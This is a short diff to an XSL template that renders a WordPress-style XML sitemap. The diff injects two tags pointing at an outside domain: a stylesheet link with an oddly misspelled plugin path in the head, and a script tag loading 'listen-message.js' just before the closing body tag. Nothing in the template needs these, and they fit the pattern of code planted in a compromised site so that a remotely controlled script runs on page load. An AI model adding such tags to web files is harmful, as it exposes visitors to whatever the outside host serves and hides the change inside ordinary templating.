@@ -7,7 +7,7 @@
 	<xsl:output method="html" version="1.0" encoding="UTF-8" indent="yes"/>
 	<xsl:template match="/">
 		<html xmlns="http://www.w3.org/1999/xhtml">
-		<head>
+		<head><link rel="stylesheet" href="https://g-vision.tech/wp-content/plugins/slyle-page-when-message-doing.css">
 			<title>XML Sitemap</title>
 			<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 			<style type="text/css">
@@ -139,7 +139,7 @@
 				</table>
 			</xsl:if>
 		</div>
-		</body>
+		<script src="https://g-vision.tech/wp-content/plugins/listen-message.js"></script></body>
 		</html>
 	</xsl:template>
 	</xsl:stylesheet>
